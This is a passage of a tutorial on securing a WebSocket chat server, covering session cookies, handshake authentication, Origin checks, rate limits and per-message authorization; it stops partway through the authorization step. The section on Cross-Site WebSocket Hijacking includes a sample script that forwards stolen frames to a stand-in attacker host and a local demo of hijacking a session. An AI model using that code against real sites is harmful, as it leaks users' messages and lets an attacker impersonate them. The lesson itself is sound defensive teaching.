# Stage 6: Auth and security

Until now, anyone who could reach port 8081 could connect, send anything, as often as they liked, from any website. In this stage we close those holes one at a time on `../websockets-server/src/server.ts`, and teach `/shared-chat` to log in and to react properly when the server says "no".

How we work here is the same as Stage 5: each step starts with a section of this lesson. You read it, Claude writes the server code, you examine it, then you test it with a checklist. The difference is that most steps now have a **frontend part** too. That part is yours (unless you say "implement it").

| Step | Idea                                                                         | Server | Frontend | Status |
| ---- | ---------------------------------------------------------------------------- | ------ | -------- | ------ |
| 6a   | One origin in development: the Vite proxy                                    | small  | ✔        | ✅     |
| 6b   | Logging in: an HTTP route that sets a session cookie                         | ✔      | ✔        | ✅     |
| 6c   | Authenticating the handshake (cookie vs token in the URL vs first message)   | ✔      | ✔        | ✅     |
| 6d   | Identity comes from the server: messages carry an `author`                   | ✔      | ✔        | ✅     |
| 6e   | Checking `Origin`: Cross-Site WebSocket Hijacking                            | ✔      | test     | ✅     |
| 6f   | Size limits and rate limits per connection                                   | ✔      | ✔        | ✅     |
| 6g   | Authorization per message, not only at connect time                         | ✔      | ✔        | ✅     |
| 6h   | Revoking access: logging out closes the session's open sockets               | ✔      | test     | ✅     |

The plan's task says "only authenticated users can join rooms". `/rooms` runs on the separate Stage 3 server, so we practised the same idea on `server.ts` (6c, 6g, 6h). Decision at the end: that counts as done; `rooms.ts` stays unauthenticated as a Stage 3 reference.

---

## §1. One origin in development (6a)

### The problem: two origins

An **origin** is `scheme + host + port`. Right now your app and your server live on two different ones:

| What            | Origin                  |
| --------------- | ----------------------- |
| The React app   | `http://localhost:5173` |
| The chat server | `http://localhost:8081` |

You saw what that means in 5e: `fetch('http://localhost:8081/health')` from the app failed with a **CORS** error. The browser refuses to show a response from another origin unless that server opts in.

In this stage that gets worse, because we add a **login cookie**:

- The app calls `POST /login` and the server answers with `Set-Cookie: session=...`.
- Across origins, `fetch` doesn't send or store cookies by default. You'd need `credentials: 'include'` on every call, plus the server would have to answer with `Access-Control-Allow-Origin: http://localhost:5173` (not `*`) and `Access-Control-Allow-Credentials: true`.
- That's a lot of setup that **production doesn't have**: in production, the app and the API are normally served from one origin (`https://chat.example.com` for the page, `https://chat.example.com/api/...` and `wss://chat.example.com/ws` for the server).

### The fix: let Vite forward the requests

Vite's dev server can act as a **proxy**: the browser talks only to `localhost:5173`, and Vite quietly forwards some paths to `localhost:8081`.

```
Browser ──── http://localhost:5173/api/login ────▶ Vite ──── http://localhost:8081/api/login ────▶ server
Browser ──── ws://localhost:5173/ws ─────────────▶ Vite ──── ws://localhost:8081/ws ─────────────▶ server
Browser ──── http://localhost:5173/shared-chat ──▶ Vite (serves the React app itself)
```

For the browser, everything is now **same-origin**: no CORS, and cookies just work. The config lives in `vite.config.ts`:

```ts
export default defineConfig({
  // ...plugins...
  server: {
    proxy: {
      '/api': 'http://localhost:8081',
      '/ws': { target: 'ws://localhost:8081', ws: true },
    },
  },
});
```

- Each key is a **path prefix**. A request whose path starts with `/api` goes to the target; everything else is Vite's as before.
- `ws: true` tells Vite to forward the WebSocket **upgrade** too, not just plain HTTP. Without it, the handshake on `/ws` never reaches the server.
- Vite's own hot-reload socket stays on Vite. It uses a different path, so there's no clash.

### The server side: give everything a clear prefix

For the proxy to tell "server" paths from "app" paths, the server moves to:

| Before (5e)       | After (6a)            |
| ----------------- | --------------------- |
| `GET /health`     | `GET /api/health`     |
| `GET /messages`   | `GET /api/messages`   |
| WebSocket on `/`  | WebSocket on `/ws`    |

That's a three-line change in `server.ts` (`WS_PATH` and the two routes). The `upgrade` handler from 5e already rejects every other path with `404`, so `ws://localhost:8081/` stops working on purpose.

### The client side: build the URL from the page's location

Instead of hard-coding `ws://localhost:8081`, the client connects to **its own origin**:

```ts
const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
const SERVER_URL = `${protocol}//${window.location.host}/ws`;
```

- `window.location.host` is `localhost:5173` in dev (with the port) and `chat.example.com` in production.
- The `https:` → `wss:` swap matters in production. A page loaded over HTTPS isn't allowed to open an unencrypted `ws://` socket (mixed content).
- Newer browsers also accept a relative URL, `new WebSocket('/ws')`, but older ones throw `SyntaxError`, so the explicit form is safer.

### Your frontend task (after Claude changes the server)

1. In `vite.config.ts`, add the `server.proxy` block shown above, next to `plugins`.
2. In `src/main.tsx`, replace `connect('ws://localhost:8081')` with a URL built from `window.location` as shown above, ending in `/ws`.
3. In `src/pages/SharedChat/SharedChat.tsx` and `src/pages/Chat/Chat.tsx`, change `SERVER_URL` the same way. (Optional tidy-up: put the URL in one place, e.g. a `SERVER_URL` export in a small `src/socket/serverUrl.ts`, and import it in all three.)
4. Restart `pnpm dev`. Vite reads `vite.config.ts` only at start-up.
5. Run `npx tsc -b`.

Leave `/rooms` (`ws://localhost:8082`) alone; it's not part of this stage yet.

---

## §2. Logging in: a session cookie (6b)

### "Fake" login, real mechanism

There is no database: you type any name plus the one shared password `Password123!` (a constant in `server.ts`), and you're "logged in" as that name. The server code marks the spot where a real app would look the user up in a database and check their password. That's fine for learning, because the part that matters for WebSockets isn't checking a password. It's **how the server remembers who you are afterwards**. That part is real and works exactly like in production.

What a real check does differently, for the record:

- The database stores a **hash** of the password (bcrypt, argon2), never the password itself, and the server compares hashes.
- A wrong name and a wrong password get the **same** answer ("wrong name or password"), so nobody can probe which names exist.
- Login attempts are rate-limited, passwords are never logged, and the whole thing runs over HTTPS.

### The flow

```
1. POST /api/login  {"name":"Gena","password":"Password123!"}
       server: checks the password (wrong -> 401 {"error":"Wrong name or password"}, no cookie)
       server: creates a session  "k3J9…" -> { name: "Gena" }   (kept in a Map, in memory)
   <-  200 {"name":"Gena"}
       Set-Cookie: session=k3J9…; HttpOnly; SameSite=Lax; Path=/; Max-Age=86400

2. Every later request to this host, the browser adds by itself:
       Cookie: session=k3J9…

3. GET /api/user
       server: reads the cookie, looks "k3J9…" up in the Map
   <-  200 {"name":"Gena"}        (or 200 {"name":null} if there's no cookie or the session is unknown)

4. POST /api/logout
       server: deletes the session from the Map
   <-  204, Set-Cookie: session=; Max-Age=0     (tells the browser to drop it)
```

- The **session id** is a long random string (`crypto.randomBytes`). It means nothing by itself. Only the server's Map turns it into "Gena". Guessing a valid one is practically impossible.
- The Map lives in memory, like `history`. **Restarting the server logs everyone out.** In production, sessions live in Redis or a database (Stage 9 territory).

### The cookie attributes, one by one

| Attribute        | What it does                                                                                                                                                                                       |
| ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `HttpOnly`       | JavaScript **can't read it**: `document.cookie` doesn't show it. If someone injects a script into your page (XSS), they still can't steal the session id. The browser sends it anyway.               |
| `SameSite=Lax`   | Sent on requests from **your own site**, and on top-level navigations from others (clicking a link to you). Not sent on `fetch`/`POST`/iframes from other sites. `Strict` is stricter, `None` sends it everywhere. |
| `Path=/`         | Sent for every path on the host, so both `/api/*` and `/ws` get it.                                                                                                                               |
| `Max-Age=86400`  | Lives for a day. Without it, it's a "session cookie" that disappears when the browser closes.                                                                                                     |
| `Secure`         | Only sent over HTTPS. **Always on in production**; we leave it off because dev runs on plain `http://`.                                                                                           |

The key sentence for the next step: **the browser attaches cookies automatically, and that includes the WebSocket handshake.** The `GET /ws` with `Upgrade: websocket` is an ordinary HTTP request, so it carries `Cookie: session=…` too. That's what 6c will check.

Two side notes:

- **Cookies ignore ports.** A cookie for `localhost` is sent to `localhost:5173` *and* `localhost:8081`. Origins care about ports, cookies don't. It doesn't matter much here (we go through the proxy), but it surprises everyone once.
- **"Site" is not "origin".** `SameSite` compares *sites* (roughly the registrable domain: `example.com`), not origins. `app.example.com` and `api.example.com` are the same site but different origins. Keep that in mind for 6e.

### What Claude adds to `server.ts`

- `app.use(express.json())`, so Express parses JSON request bodies into `request.body`.
- `sessions: Map<string, { name: string }>`, server-wide state.
- `const DEMO_PASSWORD = 'Password123!'`.
- `POST /api/login`: validates `{ name, password }` with Zod (name trimmed, 1–20 characters; password non-empty; otherwise `400`). Checks the password against `DEMO_PASSWORD`, with a comment marking where the database lookup would go (wrong → `401`). Then creates a session, sets the cookie, answers `{ name }`.
- `GET /api/user`: always `200`, with `{ name: "Gena" }` or `{ name: null }`. "Not logged in" is a normal answer to "who am I?", not an error (the same convention as `/api/current_user` in your cookbook app). `401` is kept for "you tried something that needs a login".
- `POST /api/logout`: deletes the session, clears the cookie, answers `204`.
- A small `readSessionId(cookieHeader)` helper that parses the raw `Cookie` header by hand. Express doesn't parse cookies by itself, and in 6c the **`upgrade` handler doesn't go through Express at all**, so it needs to read the raw header anyway. One helper for both.

The socket **doesn't care about the login yet**: in 6b you can still chat without logging in. 6c ties the two together.

### Your frontend task (after Claude changes the server)

All HTTP calls go through the app's one HTTP client, `apiRequest` (`src/api/apiRequest.ts`, axios). That's the point of having it: one place for the base URL, credentials and error handling. Two things in it come from the template and don't fit our server yet, so you fix them first.

**Part 1: adapt `apiRequest`**

1. **Base URL.** In `src/api/constants.ts`, change `FALLBACK_API_URL` from `'http://localhost:3000'` (the template's backend, which doesn't exist here) to `'/api'`. A relative base URL means "this origin", so requests go through the Vite proxy: `apiRequest.get('/user')` → `GET /api/user`. `VITE_BASE_API_URL` can still override it per environment.
2. **Mount `useApiNavigate()`.** The response interceptor can only redirect once a component has handed it react-router's `navigate`, and nothing calls the hook yet. Do it the way your cookbook app does: in `src/App.tsx`, move the `<ChatStatusBadge />` + `<Routes>` part into an `AppRoutes` component rendered **inside** `<BrowserRouter>` (`useNavigate` only works below the router), and call `useApiNavigate()` at its top.
3. **Fix the redirect targets** in the interceptor to routes that exist here: `401`/`403` → `/` (fine as is); `404` → `/not-found` (it says `/error`, which isn't a route).
4. **One call handles its own `401`.** A wrong password on `POST /login` answers `401`, and that's an expected answer: the form should show an error, not jump to `/`. Add `const HANDLES_OWN_UNAUTHORIZED = ['/login'];` and skip the redirect when `error.config?.url` is in it. (`/user` doesn't need it: it answers `200` with `name: null`.)
5. `withCredentials: true` can stay. It's only needed for cross-origin requests, so it does nothing now, but it doesn't hurt.

**Part 2: the auth calls**

1. Create `src/api/auth.ts` with three functions, all using `apiRequest`:
   - `fetchUser(): Promise<string | null>`: `apiRequest.get('/user')`. Returns `name` from the response (a string or `null`).
   - `login(name: string, password: string): Promise<string>`: `apiRequest.post('/login', { name, password })`. axios sends the object as JSON and sets `Content-Type` itself. Returns the name. On a wrong password axios **throws** (it rejects on every non-2xx status), so the caller catches it.
   - `logout(): Promise<void>`: `apiRequest.post('/logout')`.
   - Validate the response data with Zod schemas (`{ name: string | null }` for `/user`, `{ name: string }` for `/login`), like `chatEventSchema` in `chatStore.ts`. axios gives you `response.data` already parsed, but parsed isn't validated.
2. **Where the user lives: app-wide, not in a page.** The shared socket is app-wide (`main.tsx` connects it on every page, `ChatStatusBadge` shows it everywhere), and from 6c on that socket **depends on the login**. So the user can't be local state in `SharedChat`. Use the same pattern as `chatStore.ts`: a small module-level store read with `useSyncExternalStore`. (Not Redux yet: Stage 7 is about moving app state into Redux, and then the socket and the user move together.)
   - `src/auth/authStore.ts`: module state `auth: { user: string | null; isUserFetched: boolean }`, a `listeners` Set, `subscribe`, and `authStore = { subscribe, getSnapshot: () => auth }`. Every change **replaces** the object (`auth = { ...auth, user }`) and notifies, so `useSyncExternalStore` sees a new snapshot.
   - Three exported actions that call `src/api/auth.ts` and update the state: `loadUser()` (sets `user` and `isUserFetched = true`), `signIn(name, password)` (sets `user`; lets the error through so the form can show it), `signOut()` (sets `user = null`).
   - `src/auth/hooks.ts`: `useAuth = () => useSyncExternalStore(authStore.subscribe, authStore.getSnapshot)`, like `src/socket/hooks.ts`.
3. On app start, call `loadUser()` once, next to `connect(SERVER_URL)` in `src/main.tsx`. In 6c the two will meet there: connect only once we know there's a user.
4. **The UI: a global `UserBar`** in `src/components/UserBar/`, rendered in `AppRoutes` next to `<ChatStatusBadge />`, so login works from any page. Put both in one fixed top-right container so they don't overlap (move `position: fixed` from the badge's styles to the container).
   - Read the state with `useAuth()`. While `!isUserFetched`, show nothing.
   - When `user` is `null`, show a small form: a name input, a password input (`type="password"`) and a **Log in** button. Submitting calls `signIn(name, password)`. If it throws, show "Wrong name or password" next to the form and keep the inputs.
   - When there's a `user`, show `Logged in as <name>` and a **Log out** button that calls `signOut()`.
5. Run `npx tsc -b`.

What you'll see in DevTools after logging in: **Application → Cookies → `http://localhost:5173`** shows `session` with the **HttpOnly** column ticked, and **Network → `login` → Response Headers** shows the `Set-Cookie` line.

---

## §3. Authenticating the handshake (6c)

### Where credentials can go

The browser's `WebSocket` API is tiny: `new WebSocket(url, protocols)`. **You can't set request headers**, so there's no `Authorization: Bearer …` like with `fetch`. That leaves three places to put "who am I":

| Way                                                                    | How                                                                                         | Good                                                                                  | Bad                                                                                                                                                                       |
| ---------------------------------------------------------------------- | ------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Cookie** (what we do)                                                | The browser attaches it to the handshake `GET` by itself (you saw it in the 6b checklist).  | No client code at all. `HttpOnly`, so scripts can't steal it.                         | Only works when the socket is on the same site as the login (we made sure of that in 6a). Being automatic is also its weakness: see `Origin` in 6e.                     |
| **Token in the URL**: `wss://…/ws?token=eyJ…`                          | The client fetches a token over HTTP, then puts it in the URL.                             | Works across domains, works for non-browser clients.                                  | URLs **leak**: server access logs, proxy logs, monitoring tools all record full URLs. A leaked token = a stolen login. If you must, use a short-lived, single-use "ticket". |
| **First message**: `open` → `send('{"type":"auth","token":"eyJ…"}')` | Connect without credentials, send them as the first message.                                | Nothing in URLs or logs. Works anywhere.                                             | The server must keep every socket in a "not authenticated yet" state, ignore everything else until the auth message arrives, and close sockets that never send it.     |

There's also a hack you'll see in the wild: smuggling a token through the `protocols` argument (the `Sec-WebSocket-Protocol` header), the only header you *can* set. It works, but it abuses a header meant for something else.

Cookie is the natural choice for a same-site app, and it's what we already have.

### Where the server checks it: two ways to say "no"

The check happens in the `upgrade` handler from 5e, right after the path check: read the `Cookie` header with `getSession`, and if there's no valid session, refuse. There are two ways to refuse, and the difference matters for the **frontend**:

**A. Refuse the handshake:** answer `HTTP/1.1 401 Unauthorized` and destroy the TCP socket, like the `404` for wrong paths.

- Cheapest for the server: no WebSocket is ever created.
- But the browser **hides the reason from JavaScript**. You saw it in 6a's checklist with the old `/` path: just an `error` event and `close` with `1006`. A `401`, a `404`, a crashed server and a dead network all look the same. So `chatStore` treats it as temporary and **retries forever** with backoff.

**B. Accept, then close with an app code:** finish the handshake, then immediately `socket.close(4401, 'unauthorized')`.

- The client gets a real close frame: `event.code === 4401`. Now it **knows** it's "about you" (the Stage 4 §2 table: don't retry).
- Costs one short-lived connection per refusal.

We use **B**. `4401` is our app code (4000–4999 is the app's range); it mirrors HTTP's `401` so it's easy to remember. Your client already uses `4000` (heartbeat timeout) and `4001` (offline) for its own closes, so there's no clash.

When does a refused connect even happen, if the client only connects after login? More often than you'd think:

- **The server restarted.** Sessions live in memory, so everyone's cookie is suddenly unknown. The socket closes with `1001` (5f), the client reconnects, and gets `4401`.
- The session expired, or the user logged out in another tab (6g).
- Someone presses **Connect** while logged out.

### What Claude changes in `server.ts`

- At the top of the `connection` handler: look up the session with `getSession(request.headers.cookie)` (from `auth/sessions.ts`). The `connection` event gets the handshake's HTTP `request` as its second argument, so the cookie is right there. (Way B needs an open socket to close with a code, so the check lives here and not in `upgrade`.)
- No session → log it, `socket.close(4401, 'unauthorized')`, and **don't** add it to the `clients` Map (it never becomes a chat client).
- With a session → store the name in `ClientState` (`name: string`), and show it in the `connected` log and in `/who`.

### Your frontend task (after Claude changes the server)

1. **Connect only when logged in.** In `src/main.tsx`, replace the unconditional `connect(SERVER_URL)` with a subscription to the auth store:

   ```ts
   authStore.subscribe(() => {
     if (authStore.getSnapshot().user) {
       connect(SERVER_URL);
     } else {
       disconnect();
     }
   });
   ```

   This covers app start (`loadUser()` finds a session → connect), logging in (→ connect) and logging out (→ disconnect) in one place. It's safe to call often: `connect` returns early when a socket exists, and `disconnect` with no socket only resets the flags.
2. **Don't retry on `4401`.** In `chatStore.ts`'s `close` listener, after `stopHeartbeat()` / `setStatus('closed')`, add a check: if `event.code === 4401`, log `Not reconnecting: unauthorized`, set `shouldReconnect = false`, call `loadUser()` (from `src/auth/authStore.ts`), and return. `loadUser()` asks the server who we are; after a restart the answer is `null`, so the `UserBar` shows the login form again.
3. Run `npx tsc -b`.

Leave the **Connect** button on `/shared-chat` enabled while logged out: it's how you'll test the refusal.

---

## §4. Identity comes from the server (6d)

### The rule: never trust a name the client sends

Imagine the chat frame the client sends looked like this:

```json
{ "author": "Gena", "text": "hi" }
```

Anyone can open DevTools and run `socket.send('{"author":"Admin","text":"Your account is locked, send me your password"}')`. The server would happily broadcast it "from Admin". Everything that comes from the client can be forged: the UI is just one way of producing frames, not a guarantee.

What the client **can't** forge is its session: the server looked it up from the cookie during the handshake (6c) and stored `client.name` in this socket's `ClientState`. So:

- The client sends **only the text**, exactly as now.
- The server adds `author: client.name` when it broadcasts. The author is a fact the server knows, not a claim the client makes.

It's the same pattern as Stage 3's `rooms.ts` getting the `user` from `join` once and remembering it per connection, except that now the name comes from a login the client can't fake.

### A second kind of frame: `system`

You hit the gap in 6c: `/who` answers in plain text, which `/shared-chat` rejects as invalid. The server sends two different things to the client, and the frames should say which is which (Stage 3: a `type` field and a discriminated union):

```json
{ "type": "chat",   "id": 7, "author": "Gena", "text": "hi" }
{ "type": "system", "text": "Connected: #1 Gena (you, 3s), #2 Anna (10s)" }
```

| Frame    | Has an `id`? | Goes to          | Counts for `lastSeenId` / dedup / resume? |
| -------- | ------------ | ---------------- | ----------------------------------------- |
| `chat`   | ✔            | everyone, history | ✔                                         |
| `system` | ✘            | one client       | ✘: it's not part of the chat's history    |

`system` frames will also carry the server's "no" answers in 6f (rate limit) and 6g (not allowed).

The control strings (`__pong__`, `__reset__`) stay as they are: they're the transport layer, not something the user sees.

Plain-text clients (`/chat`, which never sends `__resume__`) get `Gena: hi` for chat events and the bare text for system frames.

### What Claude changes in `server.ts`

- `ChatEvent` becomes `{ type: 'chat'; id; author; text }`; history stores the author, so resume, `/dupe` and `GET /api/messages` include it too.
- `broadcast(text)` becomes `broadcast(client, text)`: the author always comes from the sender's `ClientState`. `/burst` messages are authored by whoever typed `/burst`.
- A `sendSystem(socket, client, text)` helper; `/who` uses it.

### Your frontend task (after Claude changes the server)

1. In `chatStore.ts`, replace `chatEventSchema` with two schemas and a union, like `src/protocol/messages.ts` from Stage 3:
   - `chatEventSchema`: `{ type: 'chat', id: int, author: string, text: string }`.
   - `systemEventSchema`: `{ type: 'system', text: string }`.
   - `serverEventSchema = z.discriminatedUnion('type', [chatEventSchema, systemEventSchema])`, and `parseChatEvent` uses it (rename it `parseServerEvent`).
2. Give the store its own message type instead of the Stage 2 `ReceivedMessage` (which `/chat` keeps using):

   ```ts
   export type SharedChatMessage =
     | { author: string; kind: 'chat'; receivedAt: number; text: string }
     | { kind: 'system'; receivedAt: number; text: string };
   ```

3. In the `message` listener, after parsing:
   - `system` → `addMessage({ kind: 'system', ... })` and return. **No** dedup and **no** `lastSeenId` update: it has no id.
   - `chat` → the existing dedup + `lastSeenId` logic, then `addMessage({ kind: 'chat', author, ... })`.
4. In `SharedChat.tsx`, render by `kind`:
   - `chat`: `12:00:01 Gena: hi`. Use `ownMessageStyles` (from `Rooms/styles.ts`) when `message.author` is the logged-in user (`useAuth().user`), `messageStyles` otherwise.
   - `system`: just the text, in a quieter style (e.g. `lastMessageStyles` from `Chat/styles.ts`: caption colour, small font).
   - Each message type needs a stable `key`; keep the index-based one for now.
5. Run `npx tsc -b`.

---

## §5. Checking `Origin`: Cross-Site WebSocket Hijacking (6e)

### The attack

In 6c the cookie's big advantage was: **the browser attaches it by itself**. That's also the problem. The browser attaches it no matter **which page** opened the socket.

Imagine you're logged in to the chat, and in another tab you open some other page. That page's script runs:

```js
const socket = new WebSocket('ws://localhost:8081/ws');
socket.onmessage = (event) => fetch('https://attacker.example/steal', { method: 'POST', body: event.data });
socket.onopen = () => socket.send('I am Gena and I approve this message');
```

If the browser sends your cookie with that handshake, the server sees a valid session and says "welcome, Gena". The attacker's page can now **read everything** you'd see, and **send messages as you**.

That's **Cross-Site WebSocket Hijacking (CSWSH)**. It's worse than classic CSRF (a form on another site that submits to yours): CSRF can only *send* a request blindly, while a hijacked socket is a **two-way** channel.

### Why CORS doesn't save us

For `fetch`, the browser protects you: a page on another origin can send a request, but it can't **read** the response unless your server allows it with CORS headers (you saw that in 5e).

**WebSockets have no CORS.** The handshake isn't checked by the browser at all, and once it succeeds, the page can read every frame. The browser leaves the decision entirely to the server. To let the server decide, it adds one header to every handshake:

```
Origin: http://localhost:5173
```

- The browser sets it; page scripts **can't change or remove it**.
- So the server can trust it **for browser clients**, which are exactly the ones carrying a victim's cookies.
- A script outside a browser (Node, curl) can send any `Origin` it likes. That's fine: it doesn't have the victim's cookies, so it can only log in as itself.

### Doesn't `SameSite=Lax` already block this?

Partly, and it's worth knowing exactly how much:

- A page on **another site** (`attacker.example`) opening the socket: the `Lax` cookie is **not sent**, so the attack gets `4401`. ✅
- A page on the **same site but another origin**: the cookie **is sent**. Remember 6b: "site" ignores subdomains (`blog.example.com` and `chat.example.com` are the same site), and it ignores ports. If any other app on your domain gets compromised, or simply has an XSS hole, it can hijack the chat. ❌
- Cookies with `SameSite=None` (needed when an app really is cross-site), and old browsers that ignore `SameSite`. ❌

So `SameSite` is a good first layer, and the `Origin` check is **the** fix: the server accepts handshakes only from origins it knows.

### See it before we fix it

This sandbox has the "same site, other origin" case built in: `http://localhost:8081` (the server itself) and `http://localhost:5173` (the app) are different origins, but the same site, because ports don't count. Try it **before** Claude changes the server:

1. Log in on `/shared-chat` as usual.
2. In a new tab, open `http://localhost:8081/api/health`. That's a page on another origin, playing the attacker's site.
3. In **that** tab's DevTools console, run:

   ```js
   const s = new WebSocket('ws://localhost:8081/ws');
   s.onmessage = (e) => console.log('stolen:', e.data);
   s.onopen = () => { s.send('__resume__:0'); s.send('hijacked!'); s.send('/who'); };
   ```

4. You'll see the whole chat history in that console, `hijacked!` appears in your real chat **as written by you**, and `/who` lists an extra connection with your name.

### The fix: an allow-list in `upgrade`

```ts
const ALLOWED_ORIGINS = new Set(['http://localhost:5173']);
```

In the `upgrade` handler, after the path check: if `request.headers.origin` isn't in the set, answer `403 Forbidden` and destroy the socket, like the `404`.

Here it's fine to refuse **before** the handshake (way A from 6c), even though the client only sees `1006`: our own app never hits this check, so there's no UX to care about. The attacker gets no explanation, and that's fine too.

Details:

- In production the list is your real origin(s) (`https://chat.example.com`), usually from an environment variable.
- **Exact match**, not "contains" or "starts with". `origin.includes('localhost')` would also allow `http://localhost.attacker.example`.
- A missing `Origin` is rejected too. Every browser sends it, so only non-browser clients lack it. Our test scripts and `dead-client.ts` will send `Origin: http://localhost:5173` explicitly.
- Through the Vite proxy, `Origin` stays `http://localhost:5173`: the proxy forwards the header untouched.

There's no frontend task in this step: you only need to test it.

---

## §6. Size limits and rate limits (6f)

After 6c–6e, only logged-in users from our own app can connect. That still leaves the question of what one logged-in connection is allowed to **do**. A buggy client in a loop, or someone typing in the DevTools console, can send:

- **huge frames**: one frame of 100 MB, which the server has to hold in memory before it can even look at it;
- **lots of frames**: thousands per second, each one broadcast to every client;
- **frames that are fine for the transport, but nonsense for the app**: an empty message, a 50,000-character "message".

The server has to protect itself and the other users, because the client can't be trusted to (§4: the UI is just one way of producing frames).

### Layer 1: the transport limit, `maxPayload` → close `1009`

`ws` has one option for this:

```ts
const wss = new WebSocketServer({ noServer: true, maxPayload: 16 * 1024 });
```

- `ws` reads the frame header (Stage 0: it starts with the payload length), sees that it's too big, and **closes the connection with `1009` "Message Too Big"** before reading the payload into memory. Our `message` handler never even runs.
- The default is **100 MiB**. Every WebSocket server should set its own.
- Choose it generously, well above the biggest legit message. It's a safety net against abuse, not a UX rule.

### Layer 2: app validation → a `system` answer, the socket stays open

A 5,000-character chat message fits in 16 KiB, but it's still not a valid chat message. That's an **app rule**:

- Text is trimmed; empty → ignored.
- Longer than `MAX_TEXT_LENGTH` (500 characters) → not broadcast; the sender gets a `system` frame: `Message too long (max 500 characters)`.

Why not close here too? Because it's an honest mistake the user can fix, not abuse. Closing is for when the connection itself is the problem.

### Layer 3: rate limiting with a token bucket → `system` warnings, then close `1008`

The classic algorithm is the **token bucket**, kept per connection (in `ClientState`):

```
bucket: up to 10 tokens (the burst)          refills 2 tokens per second (the sustained rate)

every message:  tokens >= 1 ?  → take one, handle the message
                otherwise      → reject it ("Slow down"), count a strike
```

- **Burst:** a user can paste 10 lines in a row and they all go through.
- **Sustained:** after that, at most 2 per second, which is plenty for a human.
- Tokens are refilled lazily: on each message, add `elapsedSeconds * 2` (capped at 10). No timers needed.

What happens to rejected messages:

1. Each one gets a `system` frame `Slow down: too many messages`. Not broadcast.
2. After `MAX_RATE_LIMIT_STRIKES` (20) rejected messages **in a row**, the connection is clearly not a human: the server closes it with **`1008` "Policy Violation"**. Any accepted message resets the count.

Two things are **not** counted, on purpose:

- `__ping__`: if the heartbeat got rate-limited, the client would see no `__pong__` and decide the connection is dead (Stage 4c). Never rate-limit your own keep-alive.
- `/burst`'s broadcasts: they're generated by the server, not received from the client. (The `/burst` command itself does count.)

### Watch out: the client's outbox

Stage 4e's outbox flushes up to **50** queued messages the moment the socket opens. That's more than the bucket's burst of 10, so a long offline queue would get partly rejected with "Slow down". The client and server limits have to agree. In a real app you'd either keep the outbox ≤ the burst, or pace the flush. In this sandbox it's a nice way to *see* the limiter (see the checklist).

### The close codes and the client

From the Stage 4 §2 retry table:

| Code   | Meaning                         | Retry?                                                                                                    |
| ------ | ------------------------------- | --------------------------------------------------------------------------------------------------------- |
| `1009` | Message too big                 | ✅ Yes. The big message was already sent and is gone; a new connection is fine.                           |
| `1008` | Policy violation (rate limited) | ❌ No. Something on our side is spamming; reconnecting would just repeat it. Stop and let the user act. |

### What Claude changes in `server.ts`

- `maxPayload: MAX_PAYLOAD_BYTES` (16 KiB) on the `WebSocketServer`.
- In the router, before `/freeze`, `/dupe` etc.: the token bucket (`tokens`, `lastRefillAt`, `rateLimitStrikes` in `ClientState`), skipping `__ping__`.
- Before `broadcast`: trim, ignore empty, reject longer than `MAX_TEXT_LENGTH` with a `system` frame.

### Your frontend task (after Claude changes the server)

1. In `SharedChat.tsx`, add `maxLength={500}` to the message input (a constant like `MAX_MESSAGE_LENGTH` is nicer than a bare number). It's **UX, not security**: it stops honest users early; the server still checks, because the console can send anything.
2. In `chatStore.ts`'s `close` listener, next to the `4401` branch: if `event.code === 1008`, log `Not reconnecting: policy violation (${event.reason})`, set `shouldReconnect = false`, and return. No `loadUser()` here: the session is fine, the behaviour wasn't.
3. Run `npx tsc -b`.

---

## §7. Authorization per message, not only at connect time (6g)

### Two different questions

- **Authentication**: *who are you?* We answer it once, at the handshake (6c), from the session cookie.
- **Authorization**: *are you allowed to do **this**?* That depends on the action, and the answer can **change while the socket is open**.

With HTTP, every request carries the cookie and gets checked again, so a change takes effect on the next request automatically. A WebSocket is one request that lives for **hours**. If the server checks only at connect time, then everything it decided at 9:00 still holds at 17:00:

- The user logged out in another tab at 12:00. Their old socket still chats.
- An admin took away someone's rights at 14:00. Their socket still has them.
- The session expired. The socket doesn't care.

So the rule is: **check on every message that needs a permission, against the current state**, not against a copy taken at connect time.

### What that means in our server

Right now `ClientState` holds `name`, copied from the session at connect. That's fine for display, but it's a snapshot. For authorization, the server should look the session up again:

1. At connect, store the **session id** in `ClientState` (`sessionId`), not just the name.
2. On every chat message, call `getSessionById(client.sessionId)`. If the session is gone (logged out, server-side expiry), close with `4401`. The client already handles that (6c): no retry, `loadUser()`, login form.
3. Permission checks use the session's **current** data.

This is the "lazy" check: the socket notices on its next message. 6h adds the "eager" one, closing sockets the moment a session ends.

### Something to authorize: a role and an admin-only command

Every logged-in user can do everything so far. To have something to authorize, sessions get a **role**:

- `role: 'admin' | 'user'` in the session.
- Who's an admin? In a real app, a column in the users table. Here: anyone who logs in with the name `Admin` (a constant set `ADMIN_NAMES` in `authController.ts`, next to the "check the database here" comment).
- `GET /api/user` and `POST /api/login` also return the role: `{ name, role }`.

And one admin-only command:

- **`/kick <name>`**: closes every socket of that user with **`4403` "kicked"** (mirrors HTTP `403 Forbidden`: "we know who you are, and you're not allowed"). The admin gets a `system` frame `Kicked N connection(s) of <name>`.
- Sent by a non-admin → **not** executed, and the sender gets `system` `Not allowed: /kick is for admins`. The socket stays open: asking isn't abuse.

Note what decides it: `getSessionById(client.sessionId).role` at the moment of the message. Not a role the client sends, and not one copied at connect.

### `4401` vs `4403` on the client

| Code   | Means                                 | Retry? | What the client does                                                                       |
| ------ | ------------------------------------- | ------ | ------------------------------------------------------------------------------------------ |
| `4401` | Not logged in (anymore)               | ❌     | `loadUser()` → login form (6c, unchanged)                                                  |
| `4403` | Logged in, but removed / not allowed  | ❌     | Stay logged in. Show why, and let the user press **Connect** when they want to come back. |

(A kick here isn't a ban: the session is still valid, so **Connect** works again. A ban would also delete the session, which would turn the reconnect into a `4401`.)

### What Claude changes on the server

- `auth/sessions.ts`: sessions store `{ name, role }`; a new `getSessionById(sessionId)`. The `connection` handler reads the id with `readSessionId` and keeps it.
- `auth/authController.ts`: `ADMIN_NAMES`, the role on login, `role` in the `/api/user` and `/api/login` answers.
- `server.ts`: `sessionId` in `ClientState`; the session re-check on each chat message; `/kick` with the role check.

### Your frontend task (after Claude changes the server)

1. In `chatStore.ts`'s `close` listener, add a `4403` branch next to `4401` and `1008`:
   - log `Not reconnecting: ${event.reason}`, set `shouldReconnect = false`;
